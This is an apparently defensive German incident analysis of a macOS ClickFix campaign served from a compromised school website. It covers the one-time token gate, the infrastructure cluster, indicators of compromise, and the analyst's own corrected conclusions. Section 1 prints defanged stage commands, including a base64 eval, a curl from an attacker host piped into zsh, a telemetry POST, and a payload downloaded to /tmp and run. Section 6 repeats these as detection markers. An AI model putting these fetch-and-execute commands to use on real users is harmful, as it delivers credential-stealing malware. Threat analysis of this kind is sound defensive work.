# Ein Versuch: was ein Einmal-Gate tatsächlich schützt

## Was ein Einmal-Gate mit der Vorfallsbearbeitung macht — und warum der Quelltext diesen Fall nicht von einem legitimen unterscheiden konnte

> **Richtiggestellt am 06.08.2026.** Diese Notiz erschien zuerst als *„eine ClickFix-Kette,
> die sich kein zweites Mal analysieren lässt"*. Zwei Tage später wurde die Kette
> vollständig zurückgeholt, und diese Behauptung hielt nicht. Der beschriebene Mechanismus
> war real und richtig beobachtet; der daraus gezogene Schluss war zu stark. Siehe
> Abschnitt 8.

*Erstdokumentation, August 2026*

---

## Kurzfassung

Die Website einer deutschen Grundschule lieferte ein gefälschtes Cloudflare-Overlay zur
„menschlichen Verifizierung" aus, das Besucher anwies, `⌘+Leertaste → Terminal → ⌘+V →
Enter` zu drücken. Beim Seitenaufruf hatte JavaScript längst einen Befehl in die
Zwischenablage geschrieben. Wer ihn einfügt, lädt eine zweite Stufe und leitet sie direkt
in `zsh` — nichts landet auf der Festplatte, und die betroffene Person führt den Code unter
ihren eigenen Rechten aus. Gatekeeper, XProtect und Download-Sperren kommen dabei gar nicht
erst zu Wort.

Bemerkenswert ist nicht die Technik, die ist gut dokumentiert. Bemerkenswert ist das
**Gate**: Die erste Stufe meldet sich mit einem opferindividuellen Token bei einem
Kontrollserver, und dieses Token wird **genau einmal** akzeptiert. Diese eine Entwurfsentscheidung stellt die
gesamte Untersuchung um — nicht weil sie Analyse unmöglich macht, sondern weil sie ihr eine
Uhr stellt. Abschnitt 8 hält fest, wie dieser Unterschied auf die harte Tour gelernt
wurde.

Diese Notiz ist das operative Gegenstück zum [Ad-Shield-Fall](../2026-08-ad-shield-welt-de/),
der aus sehr ähnlich aussehenden Belegen den gegenteiligen Schluss zog. Zusammen gelesen
ergeben die beiden erst das Argument.

---

## 1. Die Kette

**Stufe 0 — die Zwischenablage.** 477 Bytes, beim Seitenaufruf geschrieben:

```sh
_7dcf=<hex>;eval "$(printf '%s' '<base64>'|base64 -d)"
```

**Stufe 1 — nach einer Dekodierung:**

```sh
_xr=$(curl -s 'hxxp://enter-pverif-code[.]info/p/<opferindividuelles-token>')
if [ "$_xr" = "ok" ]; then
    curl -s $(echo "<base64>" | openssl base64 -d -A) | zsh
fi
```

**Stufe 2 — aus der inneren Schicht:**

```
hxxps://ferncurrent14[.]com/curl/<kampagnen-token>
```

**Stufe 3 — zurückgeholt am 06.08.2026** (siehe Abschnitt 8). Stufe 2 feuert in dem
Moment, in dem das Opfer einfügt, eine Telemetrie-Meldung ab und lädt dann eine universelle
Mach-O:

```
POST hxxps://grove-89[.]com/api/metrics/run?event=pasted     Header: user, BuildID
     hxxps://ferncurrent14[.]com/<id>/DANTE/update  ->  /tmp/helper
     xattr -c ; chmod +x ; ausfuehren
```

Drei Details, die man behalten sollte:

- Stufe 1 läuft über **einfaches HTTP**, Stufe 2 über HTTPS. Die Gate-Abfrage ist damit auf
  der Leitung mitlesbar — ein Geschenk an die Netzwerkerkennung und eine merkwürdige Wahl
  des Betreibers.
- Die innere Schicht nutzt `openssl base64 -d -A` statt `base64 -d`. Gleiches Ergebnis,
  andere Zeichenfolge — genug, um an einer naiven Signatur vorbeizukommen, die auf die
  naheliegende Form abstellt.
- Die Wegwerf-Variablenpräfixe (`_7dcf`, `_xr`) wechseln zwischen Kampagnen, sind innerhalb
  einer aber stabil. Das macht sie zu brauchbarem Jagdmaterial und zu schlechtem
  Blockmaterial.

---

## 2. Das Gate und was es kostet

Der Kontrollserver antwortet je Token einmal mit `ok`. Beim zweiten Abruf kommt nichts
zurück, und die `if`-Bedingung greift nie.

Dem Betreiber bringt das saubere Telemetrie pro Klick und macht wiederholte Ausführung in
Analyseumgebungen wertlos. Für die Untersuchung heißt es:

- **Ein verbrauchtes Token bleibt verbraucht.** Wenn der Zwischenablage-Inhalt vor einem
  liegt, kann es längst verbrannt sein — durch das Opfer oder durch den eigenen ersten
  Blick. Dieses eine Token kommt nicht zurück.
- **Ein gesicherter Einzeiler ist nicht übertragbar.** An eine Kollegin weitergegeben oder
  in eine Sandbox gelegt, liefert er nichts. Was wie ein reproduzierbares Artefakt aussieht,
  ist eine Einmal-Fahrkarte.
- **Nachträgliche Analyse ist unmöglich, wiederholte nicht.** Genau diesen Unterschied hat
  die erste Fassung dieser Notiz verfehlt. Ein frischer Besuch einer noch ausliefernden
  Lure erzeugt ein neues Token, und die Kette läuft erneut — siehe Abschnitt 8.

Praktisch kehrt das die übliche Reihenfolge um. Normalerweise: beobachten, Hypothese
bilden, dann sammeln, was die Hypothese braucht. Gegen ein Einmal-Gate gilt: **zuerst
sichern, in voller Treue, dann nachdenken.** Den Zwischenablage-Inhalt byteweise
festhalten, bevor er dekodiert, bevor er irgendwo eingefügt, bevor entschieden wird, was er
ist.

Aufgeschrieben klingt das selbstverständlich. Es ist nicht das, was passiert, wenn eine
Seite kaputt aussieht und der erste Reflex ist, daran herumzuprobieren.

---

## 3. Das Zeitfenster, gemessen

Am 04.08.2026 enthielt ein öffentlicher Feed einen Schwung von 29 Apex-Domains mit dem Tag
ClickFix, eingereicht um 16:56:50 UTC. Eine davon war `ferncurrent14[.]com` — derselbe
Stufe-2-Host wie in diesem Fall, was den Schwung überhaupt erst mit ihm verband.

Acht dieser Ziele wurden kurz nach 18:08 UTC abgerufen, reines Herunterladen. Rund
**70 Minuten** nach der öffentlichen Meldung:

| Zieltyp | Ergebnis |
|---|---|
| Angreiferregistrierte Hosts (3) | 404 hinter Cloudflare, 521 und 522 — Origins weg |
| Ein Lure-Pfad, eine Stunde zuvor noch da | 404 |
| Kompromittierte legitime Seiten (4) | saubere Originalseiten, keine Injektion |

Eine YARA-Regel für die Lure-Seite matchte auf **nichts**. Ein Referer-Bypass mit
macOS-Safari-Kennung änderte nichts.

Entscheidend war eine passive, keine aktive Beobachtung: Die Screenshots des öffentlichen
Scandienstes, aufgenommen zum Einreichungszeitpunkt, zeigen für dieselben Domains **die
gleichen sauberen Seiten** und `403 Forbidden` für die angreifereigenen Hosts. Der Scanner
war genauso ausgesperrt worden wie wir. Ein archiviertes DOM hätte also auch nicht
geholfen — im Archiv stand von vornherein nichts.

Das Gating ist damit stärker als eine Filterung über User-Agent oder Referer.
One-Shot-pro-IP, Geofilterung oder eine erforderliche Weiterleitungskette aus Malvertising
passen alle zum Befund. Welcher Mechanismus es auch ist — die operative Zahl zählt: **Bei
dieser Kampagne ist eine Lure innerhalb eines Fensters von deutlich unter einer Stunde
erreichbar, wenn überhaupt, und von einer Forschungsadresse aus womöglich gar nicht.**

---

## 4. Der Cluster

Die 29 Domains trennen sich sauber nach Alter, und die Trennung deckt sich mit den Rollen:

- **Acht Domains, innerhalb von sechs Tagen registriert** — die beweglichen Teile.
  Gating-Hosts, Loader-Hosts, Wegwerfnamen. Zwei davon, `enter-pverif-code[.]info` (das
  Gate dieses Falls) und `makeverizyjar[.]info`, waren beide null Tage alt und antworteten
  mit *identischer Antwortlänge*. Gleiche Rolle, gleiches Alter, gleiche Größe — und, wie
  Abschnitt 6 zeigt, dasselbe autonome System. Erst das hob es von der Vermutung zur
  Einschätzung.
- **21 etablierte Seiten**, etwa ein bis zehn Jahre alt, überwiegend WordPress. Sie sind
  die Auslieferungsfläche — die kompromittierten Websites anderer Leute.

Eine davon, `v-k[.]com[.]ua`, trug einen Pfad namens `vcapcha.ps1`. Eine PowerShell-Datei,
benannt nach einem gefälschten Captcha, ist der Windows-Arm derselben Technik aus demselben
Cluster. Bis dahin galt eine Windows-Variante als „wahrscheinlich, aber unbeobachtet"; die
Frage ist damit erledigt.

**Die 21 sind Geschädigte, keine Infrastruktur.** Sie stehen hier zur Einordnung und
bleiben bewusst aus den Indikatordateien heraus. Sie zu blockieren bestraft ihre eigenen
Nutzer und schafft ein Delisting-Problem für Leute, die nichts getan haben. Der Unterschied
zwischen „taucht in einer Kampagne auf" und „gehört zur Kampagne" ist die eigentliche
Arbeit.

---

## 5. Was diese Notiz nicht belegt

- **Das Payload.** Stufe 2 und Stufe 3 wurden am 06.08.2026 beide zurückgeholt, der
  Stealer selbst jedoch nicht: Stufe 3 ist ein Loader, dessen Nutzlast verschlüsselt in der
  eigenen Datensektion liegt und nur im Speicher entschlüsselt wird. Die Familienzuordnung
  — AMOS-Linie — stützt sich auf Ketten- und Binärmerkmale und ist als *eingeschätzt*
  vermerkt, nicht als bestätigt. In den maschinenlesbaren Feldern bleibt sie `unknown`.
- **Attribution.** Nichts hier sagt, wer dahintersteht. Eine Länderkennung ist kein
  Standort, ein Standort ist keine Staatsangehörigkeit, und gemietete Infrastruktur ist
  kein Eigentum. Die Edge-Kennungen in Serverantworten bezeichnen den nächstgelegenen
  Standort des *Abrufenden*, nicht den des Ziels.

  Das gilt uneingeschränkt auch für die Hosting-Daten in Abschnitt 6. Der Wert jenes Fundes
  liegt darin, dass ein benennbarer Provider existiert, dem man Rechtshilfe zustellen kann
  — nicht darin, dass sich eine Flagge anheften ließe.

  Wie wenig die Flaggen taugen, zeigt sich am besten, wenn man sie einfach sammelt. Für
  dieselben zwei Origin-IPs nennen vier Quellen vier verschiedene Länder:

  | Quelle | Land |
  |---|---|
  | Registrierung von `AS202412` | **SC** — Seychellen |
  | RIPE-Maintainer der Netzblöcke (`lir-tr-mgn-1-MNT`) | **TR** — Türkei |
  | `country:`-Feld im RIPE-`inetnum`-Objekt | **DE** — Deutschland |
  | Anmerkung bei AlienVault OTX | **GB** — Vereinigtes Königreich |

  Keine davon ist gelogen. Das AS ist auf den Seychellen registriert, der Adressraum wird
  über einen türkischen LIR verwaltet, der Inhaber gibt eine deutsche Anschrift an, und OTX
  liest eine veraltete Datenbank aus der Zeit, als `158.94.0.0/16` britischer
  Wissenschaftsadressraum war. Jeder Wert ist eine Tatsache über Papiere, und keine zwei
  stimmen überein — genau deshalb kann keiner die Last von „die Täter sitzen in X" tragen.

  **Stabil** ist über alle Quellen hinweg, einschließlich der Live-BGP-Daten von RIPEstat,
  nur eines: Beide Präfixe werden von `AS202412` angekündigt, gehalten von Omegatech Ltd.
  Das ist der Teil, an dem eine Ermittlung ansetzen kann — und der einzige ohne Länderkennung.
- **Das Ausmaß.** Wie viele Menschen das Overlay gesehen und wie viele ihm gefolgt sind,
  beantworten allein die Serverprotokolle der betroffenen Seite. Die liegen beim Betreiber.

---

## 6. Indikatoren

Vollständig und maschinenlesbar, CC0: [`evidence/iocs.txt`](evidence/iocs.txt).

```
enter-pverif-code.info      Gate Stufe 1 / Klick-Telemetrie (einfaches HTTP)
makeverizyjar.info          Schwester-Gate, gleiches Hosting-AS
ferncurrent14.com           Loader-Host Stufe 2 und 3
grove-89.com                Einfüge-Konversionsmeldung (ergänzt 06.08.2026)
```

`grove-89.com` hatte zum Zeitpunkt des Fundes überhaupt keine öffentliche Scan-Historie —
und feuert, bevor das Payload geladen wird. Damit ist es das früheste Netzsignal der Kette.

**Die Gates stehen nicht hinter dem Proxy.** Nachgeprüft am 06.08.2026 gegen zwei
unabhängige Resolver: Beide Gate-Domains nutzen Cloudflare-Nameserver, ihre `A`-Records
sind aber ungeproxied — die Origins liegen offen. Nur der Stufe-2-Host ist tatsächlich
proxied.

```
178.16.52.101   enter-pverif-code.info   AS202412
158.94.208.87   makeverizyjar.info       AS202412
188.114.96.3    ferncurrent14.com        AS13335 (Cloudflare) — proxied
```

`AS202412` ist *OMEGATECH-AS, Omegatech LTD*, ein autonomes System, registriert am
12.01.2026.

Das zählt doppelt. Es hebt `makeverizyjar.info` über den Zufall gleicher Antwortlänge und
gleichen Registrierungsalters hinaus — die Domain teilt sich jetzt die Hosting-Infrastruktur
mit dem bestätigten Gate, was deutlich belastbarer ist, auch wenn ein AS ebenso
Unbeteiligte beherbergt. Und es bleibt etwas übrig, woran eine Ermittlung ansetzen kann:
Eine ungeproxiede Origin benennt den Provider unmittelbar, ohne dass jemand gefragt werden
muss.

**Richtiggestellt am 07.08.2026.** Hier stand ursprünglich „— was bei einer
Cloudflare-fronted Domain nicht geht", und die Kampagnenauswertung sagte es noch schärfer:
*eine Cloudflare-fronted Domain gibt einem Ermittler nichts*. Das ist falsch, und zwar auf
eine Weise, die Ermittlungszeit kostet.

Ein vorgeschalteter Proxy beseitigt den Ansatzpunkt nicht. Er **verlagert** ihn. Die
Origin-IP hinter `ferncurrent14.com` ist nicht öffentlich sichtbar, aber Cloudflare kennt
sie, samt dem Konto, das den Dienst eingerichtet hat. Cloudflare ist ein US-Unternehmen mit
dokumentiertem Verfahren für Anfragen von Strafverfolgungsbehörden.

Nach dem, was realistisch zu erlangen ist, ist der proxied Host hier der **bessere**
Ansatzpunkt, nicht der schlechtere:

| Host | Origin öffentlich sichtbar? | Wer antwortet | Realistischer Ertrag |
|---|---|---|---|
| `ferncurrent14.com` (Stufe 2, proxied) | nein | Cloudflare, US, dokumentiertes Verfahren | Origin-IP **und** Kontodaten — und die Origin führt zu einem weiteren Provider mit Bestandsdaten |
| `enter-pverif-code.info`, `makeverizyjar.info` (Stufe 1, ungeproxied) | ja | Omegatech Ltd, AS sieben Monate zuvor registriert, türkischer LIR | Bestandsdaten, sofern überhaupt geantwortet wird |

Die ungeproxieden Origins sind kostenlose Information. Die proxied ist Information, die
jemand herausgeben muss — aber dieser Jemand ist erreichbar, und die Antwort ist mehr wert.
„Hinter einem Proxy verborgen" mit „nicht erreichbar" gleichzusetzen verwechselt *für mich
nicht sichtbar* mit *nicht zu beschaffen*, und das Zweite folgt nicht aus dem Ersten.

Der Fehler wird festgehalten statt still repariert, weil er sich fortgepflanzt hat: Er
wiederholte sich vier Wochen später in einem Entwurf für eine Geschädigtenmitteilung, in
dem Cloudflare in der Liste der anzusprechenden Anbieter fehlte — nicht aus neuer
Einschätzung, sondern weil diese Notiz die Frage bereits beantwortet zu haben schien. Ein
falscher Schluss in einem Referenzdokument ist teurer als einer in einer Arbeitsnotiz.

Wozu das ausdrücklich *nicht* taugt, steht in Abschnitt 5.

**Verhaltensmarker** — dauerhafter als die Domains, die im Tagesrhythmus rotieren:

```
eval "$(printf '%s' '<b64>'|base64 -d)"     äußere Schicht
openssl base64 -d -A                        zweite Dekodierschicht
curl -s … | zsh                             dateilose Ausführung
_7dcf / _xr                                 Wegwerf-Variablenpräfixe
```

Erkennungsregeln, die dekodierte Kette, die vollständige Cluster-Auswertung zu allen 29
Domains und das Werkzeug zur Sicherung liegen in einem eigenen Repository:
**[macos-threat-tracking](https://github.com/raimurokko/macos-threat-tracking)**.
The indicators are also published as an OTX pulse:
<https://otx.alienvault.com/pulse/6a74f0919f32840a8acc6a6f>. Das dort
abgelegte Zwischenablage-Sample trägt die MD5 `2169ff5e7be77fc3ff72758f9fa50658` — die
Referenz-Prüfsumme zweier veröffentlichter YARA-Regeln. Die Regeln lassen sich damit gegen
genau das Artefakt prüfen, aus dem sie entstanden sind.

---

## 7. Die Lehre und ihr Zwilling

Der methodische Kern steht in Abschnitt 2: **Gegen Einmal-Infrastruktur kommt das Sichern
vor der Analyse.** Es gibt keinen zweiten Blick, also ist die Treue beim ersten Kontakt das
Einzige, was überlebt.

Der unangenehmere Punkt zeigt sich aber erst, wenn man diesen Fall neben die
[Ad-Shield-Notiz](../2026-08-ad-shield-welt-de/) in diesem Repository legt.

Dort lieferte eine große Nachrichtenseite ein obfuskiertes, ins HTML injiziertes Script
aus, mit Attributen zur Umgehung von Optimierern, das eine Domain kontaktierte, die
Filterlisten als Adware führen. Jeder Oberflächenbefund sagte *Kompromittierung*. Es war
eine bezahlte, vom Verlag bewusst eingebundene Funktion.

Hier lieferte eine Schulwebsite ein obfuskiertes, ins HTML injiziertes Script aus, mit
Markern und Umgehungsmerkmalen derselben allgemeinen Form. Jeder Oberflächenbefund sagte
*Kompromittierung*. Diesmal war es eine.

Der Quelltext konnte die beiden nicht unterscheiden. Im ersten Fall kam die Antwort aus der
Domain-Reputation, im zweiten aus dem Verhalten der Infrastruktur — dem Gate, dem Token,
der Rotation. In keinem der beiden kam sie daher, den Code genauer zu lesen.

Das ist der Erwähnung wert, weil der Reflex in die andere Richtung geht: **Wenn injizierter
Fremdcode in einer Seite auftaucht, in der man ihn nicht erwartet hat, löst mehr
Code-Analyse das selten auf.** Auflösen lässt es sich, indem man klärt, wer der Absender
ist und wie sich seine Infrastruktur verhält.

---

## 8. Richtigstellung (06.08.2026): das Payload war doch zu beschaffen

Das ursprüngliche Argument lautete, ein Einmal-Gate kehre die Reihenfolge einer
Untersuchung um: Das Token verbrenne beim ersten Kontakt, das Payload sei fort, bevor man
merkt, dass man es braucht.

Zwei Tage später wurde die vollständige Kette zurückgeholt — Stufe 2, Stufe 3 und die
Mach-O.

**Das Token ist einmalig. Die Lure ist es nicht.** Ein zweiter Besuch einer noch
ausliefernden Lure-Seite erzeugt ein frisches Token, und die Kette läuft von vorn. Was das
Gate verhindert, ist *nachträgliche* Analyse: Zu einem verbrauchten Token führt kein Weg
zurück, und ein gesicherter Einzeiler funktioniert in fremder Hand nicht. Vorwärts ist
alles erreichbar, rückwärts nichts.

Die richtige Aussage lautet also nicht „das lässt sich kein zweites Mal analysieren",
sondern:

> **Die Belege haben eine Haltbarkeit, und Bereinigung verkürzt sie.**

### Der unangenehme Teil

Diese Frist läuft gegen die Meldearbeit. Jede Stunde, die in die Bereinigung einer
kompromittierten Seite geht, ist eine Stunde näher am Verlust des Samples — und das Sample
entscheidet, ob eine Meldung überhaupt eine Schadsoftware-Familie benennen kann, woran sich
die Empfänger orientieren.

Die ursprüngliche Notiz behandelte das als Reihenfolgeproblem, das sich optimieren lässt.
Das ist es nicht. Es ist ein echter Konflikt zwischen zwei Pflichten, und er löst sich
nicht durch geschickte Reihenfolge, sondern durch Parallelität: Die Sicherungsumgebung muss
stehen, **bevor** die erste Meldung hinausgeht, damit beide Stränge nicht um dasselbe
Zeitfenster konkurrieren. Hier taten sie es, und die Sicherung gelang trotzdem. Das war
Glück. Darauf zu planen, dass die Infrastruktur die Reaktion überlebt, ist ein Fehler.

### Was das Sample wert war

- Stufe 3 erwies sich als **Loader, nicht als Stealer** — sechzehn Imports, ein 69.632 Byte
  großer verschlüsselter Block bei Entropie 7,997, dazu `mlock`/`munlock`, um die
  entschlüsselte Nutzlast aus dem Swap zu halten. Das ist eine Anti-Forensik-Maßnahme,
  gerichtet auf genau die Untersuchung, die ein Verteidiger nach einem Vorfall anstellt —
  und aus den Skripten war davon nichts zu sehen.
- In Stufe 2 tauchte eine **Konversionsmeldung** auf: ein POST in dem Moment, in dem das
  Opfer einfügt, noch bevor irgendetwas geladen wird. Das ist eine Erkennungsgelegenheit
  *vor* der Kompromittierung, und sie existierte in keinem der Artefakte aus dem ersten
  Zusammentreffen.
- Zwei nicht standardisierte Request-Header tragen Kampagnen- und Build-Kennungen.

Aus diesem letzten Punkt folgten zwei Lehren, beide unangenehm.

Der erste Entwurf der technischen Analyse führte die beobachteten Header-*Werte* als
Indikatoren, mit der Begründung, sie kämen vom Builder und überlebten deshalb eine
Domain-Rotation. Plausibel und vollständig unbelegt — es gibt eine Beobachtung.
Veröffentlicht sind jetzt die Header-*Namen*; die Werte stehen in der Analyse, wo man
sieht, dass sie genau einmal vorkamen.

Die zweite zeigte sich erst bei der Duplikatsuche in SigmaHQ, vor der geplanten Einreichung
eigener Regeln: **Das Header-Paar war bereits dokumentiert.** Eine SigmaHQ-Regel vom
November 2025 matcht `curl`-POSTs mit `user:` und `BuildID`, abgelegt unter Atomic macOS
Stealer und gestützt auf eine Untersuchung von Trend Micro. Wir hatten sie unabhängig
gefunden und als die dauerhaftesten Indikatoren der Kette bezeichnet — die erste Hälfte
stimmt, die Neuheit nicht.

Der Trost wiegt schwerer als die Korrektur: Ein unabhängiges Team sah dieselben zwei vom
Builder erzeugten Header in einer Auslieferung, die es AMOS zuordnet. Das ist jetzt die
stärkste Stütze der Familienzuordnung — und sie kam aus einer Erkennungsregel, nicht aus
einem Threat-Report. Ein Argument dafür, fremde Regeln zu lesen und nicht nur fremde
Prosa.

### Angepasste Handlungsempfehlung

1. Ein Einmal-Gate ist eine **Uhr**, kein Schloss.
2. Die Sicherungsumgebung steht, bevor gemeldet wird, nicht danach.
3. **Von der Auslieferung nicht auf die Fähigkeit schließen.** Nach den Skripten sah das
   nach schlichtem Herunterladen und Ausführen aus. Es war ein selbstentschlüsselnder
   In-Memory-Loader — in einem Bericht etwas grundlegend anderes.
4. Erweist sich eine Behauptung als zu stark, wird die Notiz geändert und nicht still
   zurückgezogen. Der Mechanismus war real und richtig beobachtet. Falsch war nur der
   Schluss.

Vollständige technische Darstellung, samt dem, was gegen das Sample nachgerechnet wurde:
[macos-threat-tracking, Kampagne DANTE](https://github.com/raimurokko/macos-threat-tracking/blob/main/campaigns/2026-08-04-cloudflare-clickfix/payload_analysis.md).

---

## 9. Zweite Richtigstellung (07.08.2026): auch die Verschlüsselung war eine Uhr

Abschnitt 8 endete mit dem geborgenen Payload und einem Vorbehalt: Der Stealer selbst lag
weiterhin als verschlüsselter Block vor, und die Analyse vermerkte, seine Bergung sei „von
hier aus machbar, wurde aber nicht gebraucht".

Auf diesem Vorbehalt wuchs dann eine These. Der Loader trägt ein Klartext-Label,
`hwval-frag`, unmittelbar neben Code, der `IOPlatformSerialNumber` und `IOPlatformUUID`
ausliest. Die naheliegende Lesart war Environmental Keying: Das Payload entschlüsselt sich
nur auf der Maschine, für die es bestimmt war. Das wäre die eleganteste Eigenschaft des
ganzen Samples gewesen. Sie erklärte das opferindividuelle Gate, sie erklärte den Aufwand
bei der Analyse-Erkennung, und sie erklärte, warum siebzig Kandidatenschlüssel allesamt
gescheitert waren.

Sie war falsch. Der Schlüssel ist eine Übersetzungszeit-Konstante — die ersten vier Bytes
des HKDF-Seeds, der im Klartext in derselben Datei steht, rückwärts gelesen und durch
Arithmetik geführt, die verhindert, dass er je als Immediate auftaucht. Emuliert man die
Instruktionen des Loaders selbst, fällt er in Sekunden heraus. `hwval-frag` benennt die
Fragmenttabelle mit den *Namen* der Hardware-APIs. Es ging nie um den Schlüssel.

### Die Form des Fehlers

Der Fehler liegt nicht darin, dass eine These scheiterte. Er liegt darin, woraus sie
gebaut war.

Siebzig Schlüssel waren geprüft, keiner passte. Daraus ließen sich zwei Schlüsse ziehen:
*Ich habe den Schlüssel nicht gefunden* und *der Schlüssel ist statisch nicht auffindbar*.
Der erste ist eine Aussage über die Suche. Der zweite ist eine Aussage über das Sample und
braucht eigene Belege, die nie erhoben wurden. Den Sprung leicht gemacht hat, dass der
zweite Schluss der interessantere war. Er verwandelte eine Sackgasse in einen Befund.

Das ist der Fehlermodus, der benannt gehört, denn von innen ist er nicht erkennbar. Eine
negative Fähigkeitsbehauptung — das geht nicht — erzeugt keinen Widerspruch, solange man
sie hält. Nichts wehrt sich. Die Suche endet, und das Enden fühlt sich an wie ein Ergebnis.

Das Anzeichen war im Rückblick das Wort *elegant*. Es stand in den Arbeitsnotizen als Lob
für den Entwurf des Samples, und Lob für den Entwurf eines Gegners ist eine nachvollziehbare
Empfindung und eine schlechte Argumentationsgrundlage. Es leistete Beweisarbeit, für die es
nicht bezahlt hatte.

Der richtige Schritt war billig und wurde übersprungen: Der Schlüssel war 32 Bit lang, mit
einem Poly1305-Tag als Prüforakel. Selbst ohne jede Vorstellung von seiner Herkunft war die
vollständige Suche begrenzt und durchführbar. „Prinzipiell unmöglich" war nicht bloß
unbelegt, es widersprach einer Zahl, die in der Analyse bereits notiert war.

### Das Muster, zum dritten Mal

Dieser Fall hat nun dreimal dieselbe Form hervorgebracht.

| Haltepunkt | Was das Weitergehen zeigte |
|---|---|
| „Das Token ist verbraucht, das Payload ist weg" | Das Gate ist eine Uhr. Ein zweiter Besuch liefert ein frisches Token. |
| „Das Payload ist verschlüsselt, dafür braucht es den Opferrechner" | Die Verschlüsselung ist eine Uhr. Der Schlüssel lag in der Datei. |
| „Die API-Oberfläche des Loaders reicht für die Detektionsarbeit" | Das Payload installiert zwei Root-LaunchDaemons und ersetzt drei Wallet-Anwendungen. |

Jedes Mal war der Haltepunkt vertretbar, als er gesetzt wurde. Jedes Mal erstarrte er zu
einer Eigenschaft des Falls, statt zu bleiben, was er war: eine Beschreibung, wo die Arbeit
pausierte. Und jedes Mal veränderte das Jenseitige etwas Wesentliches — beim dritten Mal die
Empfehlung an eine Geschädigte, von *Zugangsdaten wechseln* zu *dieser Rechner gehört Ihnen
nicht mehr*.

Die ersten beiden kosteten Analysezeit. Das dritte hätte jemanden den Rechner gekostet.

### Was es wert war

- **Sechs ChaCha20-Poly1305-Chunks** unter einem PBKDF2-Schlüssel mit 98.222 Iterationen.
  Alle sechs Tags verifizieren, das Ergebnis ist damit bewiesen und nicht begutachtet.
- **Zwei Root-LaunchDaemons**, getarnt als `com.apple.accountsd.helper` und
  `com.apple.metadata.mds.worker`, installiert mit dem Passwort aus dem Fake-Dialog.
- **Ledger, Trezor und Exodus ersetzt** durch nachgeladene Builds. Nicht Diebstahl aus
  einer Wallet — eine Wallet, die jetzt jemand anderem gehört.
- **Ein neuer C2**, `grove53.com`, eine Domain neben dem Stufe-2-Beacon und mit demselben
  Telemetriepfad.
- **Die Blacklist der Analysewerkzeuge**, verschlüsselt in der Datei und erst zur Laufzeit
  zusammengesetzt: 29 Werkzeuge, neun Umgebungsvariablen. Durch Emulation geborgen, für
  jeden Dateiscan unsichtbar.

### Und dann noch einmal, vier Stunden später

Die Liste oben entstand am selben Nachmittag, und sie enthält einen eigenen Fehler.

Die zwei Root-LaunchDaemons und der Wallet-Austausch wurden als Befunde notiert, und der
erste Entwurf der technischen Analyse ging weiter: Er behauptete, keines der beiden
Verhalten sei in veröffentlichten AMOS-Beschreibungen enthalten, und schloss daraus, das
spreche *gegen* eine AMOS-Zuordnung.

Beide Hälften waren falsch. Die Prüfung bei SigmaHQ vor dem Einreichen der Regeln —
dieselbe Prüfung, die schon die Behauptung in Abschnitt 8 zu Fall gebracht hatte — förderte
zwei AMOS-Regeln vom November 2025 zutage. Deren Referenzen beschreiben Persistenz per
LaunchDaemon mit abgephishtem Passwort und den Austausch von Ledger, Trezor und Exodus aus
Archiven namens `app.zip`, `apptwo.zip` und `appex.zip` unter einem `/zxc/`-Pfad. Dieselben
drei Archivnamen. Anderer Host, identische Dateinamen, neun Monate früher.

Damit trägt diese Notiz zwei wiederkehrende Fehler, nicht einen.

Der erste ist der Haltepunkt, der zur Behauptung erstarrt. Der zweite ist, **etwas neu zu
nennen, ohne nachgesehen zu haben** — und der ist in diesem Fall nun zweimal passiert, am
06.08. mit dem Header-Paar und am 07.08. mit dem Persistenzverhalten. Das zweite Mal weniger
als vierundzwanzig Stunden nach der Niederschrift des ersten, in derselben Notiz, unter der
Überschrift *die Neuheit hielt nicht*.

Das gehört ausgehalten und nicht wegerklärt. Um eine Verzerrung zu wissen und gerade einen
Absatz darüber geschrieben zu haben, hilft offenbar nicht. Geholfen hat beide Male ein
mechanischer Schritt aus einem anderen Arbeitsgang: Wer eine SigmaHQ-Einreichung vorbereitet,
muss auf Dubletten prüfen, und diese Prüfung hat die Korrektur erzeugt. Selbsterkenntnis hat
in keinem der beiden Fälle etwas gefunden.

Der praktische Schluss ist für eine auf Sorgfalt gebaute Arbeitsweise unangenehm: **Das
Mittel ist nicht mehr Sorgfalt, sondern ein früherer Punkt auf der Checkliste.** Die Suche
nach Vorarbeit gehört vor den ersten Entwurf, wo sie eine Stunde kostet, und nicht vor die
Einreichung, wo sie eine Überarbeitung kostet — und wo sie, würde die Arbeit nirgends
eingereicht, gar nichts kosten und den Fehler schlicht stehen lassen würde.

Die Richtigstellung steht in
[stage4_payload.md §6](https://github.com/raimurokko/macos-threat-tracking/blob/main/campaigns/2026-08-04-cloudflare-clickfix/stage4_payload.md).
Sie hat die Familieneinstufung außerdem von *AMOS lineage, assessed* auf **AMOS, bestätigt**
gehoben — der Teil, der am wenigsten schmerzt und am meisten zählt. Die Neuheit falsch
einzuschätzen kostete einen Absatz. Die Familie richtig einzuschätzen ist das, was ein
Empfänger der Indikatoren tatsächlich braucht.

### Angepasste Handlungsempfehlung, zweiter Durchgang

5. **„Wir haben es nicht gefunden" und „es ist nicht auffindbar" sind verschiedene
   Behauptungen.** Nur die erste ist umsonst zu haben. Die zweite braucht Belege, und sie
   ist die attraktivere von beiden — genau deshalb muss sie geprüft werden.
6. **Den Schlüsselraum abzählen, bevor man eine Wand ausruft.** Ein 32-Bit-Schlüssel mit
   Prüforakel ist Fleißarbeit, keine Unmöglichkeit. Die Zahl stand zur Verfügung, bevor die
   These es tat.
7. **Emulieren statt ausführen.** Unicorn, das die Instruktionen interpretiert, beantwortet
   die Frage „woher stammt dieser Wert" — was reine Brute Force nie geleistet hätte und was
   die Sache tatsächlich entschieden hat. Eine VM hätte hier gar nichts beantwortet: Das
   Sample prüft auf VMs.
8. **Auf ästhetische Zufriedenheit in den eigenen Notizen achten.** Den Entwurf eines
   Gegners elegant zu nennen ist in Ordnung. Das zum Grund zu machen, aufzuhören, nicht.
9. **Vorarbeit vor dem ersten Entwurf suchen, nicht vor der Einreichung.** Zweimal hat in
   diesem Fall eine Neuheitsbehauptung den Weg in eine geschriebene Analyse gefunden und
   wurde nur durch eine Dublettenprüfung aus anderem Anlass gefunden. Die Prüfung ist
   billig und war das Einzige, was funktioniert hat.
10. **Nicht erwarten, dass das Wissen um eine Verzerrung vor ihr schützt.** Der zweite
    Neuheitsfehler entstand Stunden nach der Veröffentlichung eines Abschnitts über den
    ersten. Gefunden hat ihn das Verfahren, nicht die Wachsamkeit.

Vollständige technische Darstellung und die Werkzeuge zur Reproduktion:
[stage4_payload.md](https://github.com/raimurokko/macos-threat-tracking/blob/main/campaigns/2026-08-04-cloudflare-clickfix/stage4_payload.md).

---

## 10. Umgang mit dem Fall

